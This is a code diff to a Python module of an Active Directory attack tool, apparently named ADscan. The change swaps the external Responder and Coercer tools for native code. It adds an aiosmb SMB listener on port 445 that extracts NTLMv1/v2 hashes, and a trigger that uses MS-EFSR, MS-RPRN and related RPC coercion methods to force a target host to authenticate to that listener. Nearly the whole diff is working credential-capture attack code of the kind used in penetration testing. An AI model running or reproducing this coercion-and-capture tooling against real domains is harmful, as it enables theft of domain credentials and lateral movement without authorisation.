@@ -2,46 +2,52 @@
 
 This module provides a small orchestration layer for workflows that need to:
 
-- start a listener in the background (currently Responder)
-- trigger outbound authentication (currently Coercer)
-- observe a capture source and classify NTLMv1 vs NTLMv2
+- start an async SMB capture listener in the background
+- trigger outbound authentication with ADscan's native async coercion stack
+- observe the capture queue and classify NTLMv1 vs NTLMv2
 
-The goal is to keep the capture logic reusable for future NTLM relay and
-coercion techniques without coupling the interactive CLI directly to a
-specific external tool implementation.
+The listener is the native ``SMBNtlmCaptureSource`` from
+``services.relay.smb_ntlm_capture``; this module wraps it behind a
+synchronous ``start()/stop()/wait_for_capture()`` interface for callers that
+are not running on an asyncio event loop.
 """
 
 from __future__ import annotations
 
+import asyncio
 from dataclasses import dataclass
-import os
-import sqlite3
 import subprocess
 import time
-from typing import Any, Callable, Iterable, Protocol
+from typing import Callable, Iterable
 
-from adscan_internal.background_process import launch_background, stop_background
-from adscan_internal.integrations.coercer import CoercerRunner
+import queue as _queue
+import threading
 
+from aiosmb.commons.connection.factory import SMBConnectionFactory
 
-class SpawnShell(Protocol):
-    """Shell surface required to start/stop background listener processes."""
-
-    def spawn_command(
-        self,
-        command: list[str],
-        *,
-        env: dict[str, str] | None = None,
-        shell: bool = False,
-        stdout: Any = None,
-        stderr: Any = None,
-        preexec_fn: Any = None,
-    ) -> Any:
-        """Spawn a command in the background."""
-        ...
+from adscan_internal.services.async_bridge import run_async_sync
+from adscan_internal.services.coercion.runner import (
+    NativeCoercionRunConfig,
+    run_native_coercion,
+)
 
 
 RunCommand = Callable[..., subprocess.CompletedProcess[str] | None]
+
+
+def looks_like_ntlm_hash(value: str) -> bool:
+    """Return whether ``value`` looks like a bare NT hash.
+
+    Delegates to the central
+    :func:`adscan_internal.services.credential_routing.looks_like_ntlm_hash`
+    so the format definition stays single-sourced. Re-exported here as a
+    backward-compat alias for existing callers in this module.
+    """
+    from adscan_internal.services.credential_routing import (
+        looks_like_ntlm_hash as _central,
+    )
+
+    return _central(value)
 
 
 @dataclass(frozen=True)
@@ -74,13 +80,98 @@ class NtlmCaptureProbeResult:
     listener_expected_stop: bool
 
 
-def _extract_responder_username(raw_user: str) -> tuple[str, str | None]:
-    """Split ``DOMAIN\\user`` values returned by Responder."""
+@dataclass(frozen=True)
+class NativeCoercionExecution:
+    """Outcome of one native coercion trigger attempt."""
 
-    if "\\" in raw_user:
-        netbios_domain, username = raw_user.split("\\", 1)
-        return username, netbios_domain
-    return raw_user, None
+    auth_mode: str
+    command: list[str]
+    returncode: int
+    stdout: str
+    stderr: str
+    error_kind: str | None
+    error_detail: str | None
+
+
+class NativeCoercionTrigger:
+    """Run ADscan native coercion as an NTLM capture trigger."""
+
+    def run(
+        self,
+        *,
+        target: str,
+        listener_ip: str,
+        username: str,
+        secret: str,
+        domain: str,
+        timeout_seconds: int,
+        auth_type: str = "smb",
+        dc_ip: str | None = None,
+        method_filter: str | None = None,
+        use_kerberos: bool = False,
+        env: dict[str, str] | None = None,
+    ) -> NativeCoercionExecution:
+        """Execute native coercion and return subprocess-like metadata."""
+
+        del env
+        command = _native_trigger_command(
+            target=target,
+            listener_ip=listener_ip,
+            domain=domain,
+            auth_type=auth_type,
+            method_filter=method_filter,
+            use_kerberos=use_kerberos,
+        )
+        try:
+            result = run_async_sync(
+                _run_native_coercion_trigger(
+                    target=target,
+                    listener_ip=listener_ip,
+                    username=username,
+                    secret=secret,
+                    domain=domain,
+                    timeout_seconds=timeout_seconds,
+                    auth_type=auth_type,
+                    dc_ip=dc_ip,
+                    method_filter=method_filter,
+                    use_kerberos=use_kerberos,
+                )
+            )
+        except Exception as exc:  # noqa: BLE001 - converted to structured probe result
+            return NativeCoercionExecution(
+                auth_mode="kerberos" if use_kerberos else "smb",
+                command=command,
+                returncode=1,
+                stdout="",
+                stderr=str(exc),
+                error_kind=type(exc).__name__,
+                error_detail=str(exc),
+            )
+
+        summary = (
+            f"native coercion success={result.success} attempts={result.attempts} "
+            f"timed_out={result.timed_out}"
+        )
+        if result.success:
+            first = result.successful_results[0]
+            summary += f" method={first.protocol}/{first.method_name}"
+        else:
+            failures = [
+                f"{attempt.protocol}/{attempt.method_name}:{attempt.error or attempt.error_code or 'failed'}"
+                for attempt in result.results[:5]
+            ]
+            if failures:
+                summary += " failures=" + "; ".join(failures)
+
+        return NativeCoercionExecution(
+            auth_mode="kerberos" if use_kerberos else "smb",
+            command=command,
+            returncode=0 if result.success else 1,
+            stdout=summary,
+            stderr="",
+            error_kind=None if result.success else "coercion_not_triggered",
+            error_detail=None if result.success else summary,
+        )
 
 
 def _normalize_expected_usernames(values: Iterable[str]) -> set[str]:
@@ -94,71 +185,204 @@ def _normalize_expected_usernames(values: Iterable[str]) -> set[str]:
     return normalized
 
 
-class ResponderListener:
-    """Background Responder listener with capture observation helpers."""
+async def _run_native_coercion_trigger(
+    *,
+    target: str,
+    listener_ip: str,
+    username: str,
+    secret: str,
+    domain: str,
+    timeout_seconds: int,
+    auth_type: str,
+    dc_ip: str | None,
+    method_filter: str | None,
+    use_kerberos: bool,
+):
+    secret_type = "nt" if looks_like_ntlm_hash(secret) else "password"
+    # When Kerberos auth is requested, aiosmb derives the ``cifs/<target>`` SPN
+    # from this very ``target`` argument. A short hostname or IP yields a
+    # ticket the server rejects (same pattern as LDAP/SMB); promote to FQDN.
+    if use_kerberos:
+        from adscan_internal.services._kerberos_spn import (
+            normalize_kerberos_target_hostname,
+        )
+
+        spn_target = normalize_kerberos_target_hostname(target, domain) or target
+    else:
+        spn_target = target
+    factory = SMBConnectionFactory.from_components(
+        spn_target,
+        username,
+        secret,
+        secrettype=secret_type,
+        domain=domain,
+        dcip=dc_ip or target,
+        authproto="kerberos" if use_kerberos else "ntlm",
+    )
+    protocols, method_names = _native_filter_from_method(method_filter)
+    return await run_native_coercion(
+        connection_factory=factory,
+        target_host=target,
+        config=NativeCoercionRunConfig(
+            listener_host=listener_ip,
+            listener_auth_type="http" if auth_type.lower() == "http" else "smb",
+            timeout_seconds=float(timeout_seconds),
+            stop_on_first_success=True,
+            protocols=protocols,
+            method_names=method_names,
+            show_summary=False,
+        ),
+    )
+
+
+def _native_filter_from_method(
+    method_filter: str | None,
+) -> tuple[tuple[str, ...], tuple[str, ...]]:
+    candidate = str(method_filter or "").strip()
+    if not candidate:
+        return ("EFSR", "RPRN"), ()
+    normalized = candidate.upper().replace("MS-", "")
+    if normalized in {"EFSR", "RPRN", "DFSNM", "FSRVP", "EVEN"}:
+        return (normalized,), ()
+    return (), (candidate,)
+
+
+def _native_trigger_command(
+    *,
+    target: str,
+    listener_ip: str,
+    domain: str,
+    auth_type: str,
+    method_filter: str | None,
+    use_kerberos: bool,
+) -> list[str]:
+    command = [
+        "adscan-native-coercion",
+        "--target",
+        target,
+        "--listener",
+        listener_ip,
+        "--domain",
+        domain,
+        "--auth-type",
+        auth_type,
+    ]
+    if method_filter:
+        command.extend(["--method", method_filter])
+    if use_kerberos:
+        command.append("--kerberos")
+    return command
+
+
+class NativeListenerCapture:
+    """SMB relay listener backed by ``aiosmb`` for active coercion capture.
+
+    Exposes a synchronous ``start() / stop() / wait_for_capture()`` interface
+    that runs the async ``SMBNtlmCaptureSource`` on a background asyncio event
+    loop in a dedicated thread and bridges captured NTLM observations to a
+    ``threading.Queue`` for synchronous consumption.
+    """
+
+    exit_returncode: int | None = None
+    exit_expected_stop: bool = False
 
     def __init__(
         self,
         *,
-        responder_python: str,
-        responder_script: str,
-        responder_db_path: str,
-        interface: str,
-        shell: SpawnShell,
-        label: str = "Responder",
+        listen_host: str = "0.0.0.0",
+        listen_port: int = 445,
     ) -> None:
-        self.responder_python = responder_python
-        self.responder_script = responder_script
-        self.responder_db_path = responder_db_path
-        self.interface = interface
-        self.shell = shell
-        self.label = label
-        self.process: Any = None
-        self.exit_returncode: int | None = None
-        self.exit_expected_stop = False
-
-    def _handle_process_exit(self, returncode: int | None, expected_stop: bool) -> None:
-        """Persist watcher exit metadata for later diagnostics."""
-
-        self.exit_returncode = returncode
-        self.exit_expected_stop = expected_stop
+        self.listen_host = listen_host
+        self.listen_port = listen_port
+        self._capture_queue: _queue.Queue[NtlmCaptureObservation] = _queue.Queue()
+        self._thread: threading.Thread | None = None
+        self._loop: asyncio.AbstractEventLoop | None = None
+        self._stop_event: asyncio.Event | None = None
 
     def clear_database(self) -> None:
-        """Delete all prior captures from the Responder SQLite database."""
-
-        if not os.path.exists(self.responder_db_path):
-            return
-
-        with sqlite3.connect(self.responder_db_path) as connection:
-            cursor = connection.cursor()
-            cursor.execute("DELETE FROM Responder")
-            connection.commit()
+        """No-op — native listener has no persistent state to clear."""
 
     def start(self) -> bool:
-        """Start Responder in the background."""
+        """Start the SMB relay listener in a background thread."""
 
-        env = os.environ.copy()
-        command = [
-            self.responder_python,
-            self.responder_script,
-            "-I",
-            self.interface,
-        ]
-        self.process = launch_background(
-            command,
-            self.shell.spawn_command,
-            env=env,
-            needs_root=True,
-            label=self.label,
-            watch=True,
-            on_exit=self._handle_process_exit,
+        ready_event = threading.Event()
+        error_holder: list[Exception] = []
+
+        def _run_loop() -> None:
+            loop = asyncio.new_event_loop()
+            self._loop = loop
+            asyncio.set_event_loop(loop)
+            try:
+                loop.run_until_complete(self._async_main(ready_event, error_holder))
+            finally:
+                loop.close()
+
+        self._thread = threading.Thread(target=_run_loop, daemon=True, name="native-smb-listener")
+        self._thread.start()
+        ready_event.wait(timeout=5.0)
+        if error_holder:
+            return False
+        return True
+
+    async def _async_main(
+        self,
+        ready_event: threading.Event,
+        error_holder: list[Exception],
+    ) -> None:
+        from adscan_internal.services.relay.smb_ntlm_capture import (  # noqa: PLC0415
+            SMBNtlmCaptureConfig,
+            SMBNtlmCaptureSource,
+            extract_ntlm_hash,
         )
-        return self.process is not None
+
+        config = SMBNtlmCaptureConfig(listen_host=self.listen_host, listen_port=self.listen_port)
+        gssapi_queue: asyncio.Queue[object] = asyncio.Queue()
+        source = SMBNtlmCaptureSource(config, gssapi_queue)
+        self._stop_event = asyncio.Event()
+
+        try:
+            await source.start()
+        except Exception as exc:  # noqa: BLE001
+            error_holder.append(exc)
+            ready_event.set()
+            return
+
+        ready_event.set()
+
+        try:
+            while not self._stop_event.is_set():
+                try:
+                    gssapi = await asyncio.wait_for(gssapi_queue.get(), timeout=0.5)
+                except asyncio.TimeoutError:
+                    continue
+
+                result = extract_ntlm_hash(gssapi)
+                if result is None:
+                    continue
+
+                raw_user = (
+                    f"{result.domain}\\{result.username}"
+                    if result.domain and result.username
+                    else (result.username or "")
+                )
+                self._capture_queue.put(
+                    NtlmCaptureObservation(
+                        raw_user=raw_user,
+                        clean_user=result.username or "",
+                        ntlm_version=result.ntlm_version,
+                        fullhash=result.fullhash,
+                    )
+                )
+        finally:
+            await source.stop()
 
     def stop(self) -> None:
-        """Stop the background Responder process if it is running."""
+        """Stop the background listener."""
 
-        stop_background(self.process, label=self.label)
+        if self._loop is not None and self._stop_event is not None:
+            self._loop.call_soon_threadsafe(self._stop_event.set)
+        if self._thread is not None:
+            self._thread.join(timeout=5.0)
 
     def wait_for_capture(
         self,
@@ -167,61 +391,29 @@ class ResponderListener:
         expected_usernames: Iterable[str] | None = None,
         poll_interval_seconds: float = 1.0,
     ) -> NtlmCaptureObservation | None:
-        """Wait for the first matching NTLM capture in ``Responder.db``."""
+        """Wait for the first matching NTLM capture from the native listener."""
 
         deadline = time.time() + max(timeout_seconds, 1)
         expected = _normalize_expected_usernames(expected_usernames or [])
-        seen_rows: set[tuple[str, str, str]] = set()
 
         while time.time() < deadline:
-            if not os.path.exists(self.responder_db_path):
-                time.sleep(poll_interval_seconds)
-                continue
-
+            remaining = deadline - time.time()
             try:
-                with sqlite3.connect(self.responder_db_path) as connection:
-                    cursor = connection.cursor()
-                    cursor.execute(
-                        "SELECT user, fullhash, type FROM Responder ORDER BY rowid DESC"
-                    )
-                    rows = cursor.fetchall()
-            except sqlite3.Error:
-                time.sleep(poll_interval_seconds)
+                obs = self._capture_queue.get(timeout=min(poll_interval_seconds, max(remaining, 0.01)))
+            except _queue.Empty:
                 continue
 
-            for raw_user, fullhash, hash_type in rows:
-                key = (str(raw_user), str(fullhash), str(hash_type))
-                if key in seen_rows:
-                    continue
-                seen_rows.add(key)
-
-                clean_user, _ = _extract_responder_username(str(raw_user))
-                if expected and clean_user.casefold() not in expected:
-                    continue
-
-                lowered_hash_type = str(hash_type or "").casefold()
-                if "v1" in lowered_hash_type:
-                    version = "NTLMv1"
-                elif "v2" in lowered_hash_type:
-                    version = "NTLMv2"
-                else:
-                    continue
-
-                return NtlmCaptureObservation(
-                    raw_user=str(raw_user),
-                    clean_user=clean_user,
-                    ntlm_version=version,
-                    fullhash=str(fullhash),
-                )
-
-            time.sleep(poll_interval_seconds)
+            if expected and obs.clean_user.casefold() not in expected:
+                continue
+            return obs
 
         return None
 
+
 def run_ntlm_capture_probe(
     *,
-    listener: ResponderListener,
-    trigger: CoercerRunner,
+    listener: NativeListenerCapture,
+    trigger: NativeCoercionTrigger,
     target: str,
     listener_ip: str,
     username: str,
@@ -260,30 +452,12 @@ def run_ntlm_capture_probe(
         )
 
     trigger_command: list[str] = []
-    trigger_result: subprocess.CompletedProcess[str] | None = None
+    trigger_result: NativeCoercionExecution | None = None
     trigger_error_kind: str | None = None
     trigger_error_detail: str | None = None
     try:
         listener.clear_database()
         sleep_fn(max(listener_ready_delay_seconds, 0.0))
-        if listener.process is not None and hasattr(listener.process, "poll"):
-            if listener.process.poll() is not None:
-                return NtlmCaptureProbeResult(
-                    success=False,
-                    auth_type=None,
-                    observation=None,
-                    reason="listener_exited_early",
-                    trigger_command=[],
-                    trigger_auth_mode=None,
-                    attempted_trigger_auth_modes=(),
-                    trigger_returncode=None,
-                    trigger_stdout="",
-                    trigger_stderr="",
-                    trigger_error_kind=None,
-                    trigger_error_detail=None,
-                    listener_returncode=listener.exit_returncode,
-                    listener_expected_stop=listener.exit_expected_stop,
-                )
         trigger_execution = trigger.run(
             target=target,
             listener_ip=listener_ip,
@@ -298,7 +472,7 @@ def run_ntlm_capture_probe(
             method_filter=method_filter,
         )
         trigger_command = trigger_execution.command
-        trigger_result = trigger_execution.result
+        trigger_result = trigger_execution
         trigger_error_kind = trigger_execution.error_kind
         trigger_error_detail = trigger_execution.error_detail
         sleep_fn(max(post_trigger_wait_seconds, 0.0))
@@ -321,8 +495,8 @@ def run_ntlm_capture_probe(
             trigger_returncode=(
                 trigger_result.returncode if trigger_result is not None else None
             ),
-            trigger_stdout=(trigger_result.stdout or "") if trigger_result else "",
-            trigger_stderr=(trigger_result.stderr or "") if trigger_result else "",
+            trigger_stdout=trigger_result.stdout if trigger_result else "",
+            trigger_stderr=trigger_result.stderr if trigger_result else "",
             trigger_error_kind=trigger_error_kind,
             trigger_error_detail=trigger_error_detail,
             listener_returncode=listener.exit_returncode,
@@ -344,8 +518,8 @@ def run_ntlm_capture_probe(
         trigger_returncode=(
             trigger_result.returncode if trigger_result is not None else None
         ),
-        trigger_stdout=(trigger_result.stdout or "") if trigger_result else "",
-        trigger_stderr=(trigger_result.stderr or "") if trigger_result else "",
+        trigger_stdout=trigger_result.stdout if trigger_result else "",
+        trigger_stderr=trigger_result.stderr if trigger_result else "",
         trigger_error_kind=trigger_error_kind,
         trigger_error_detail=trigger_error_detail,
         listener_returncode=listener.exit_returncode,
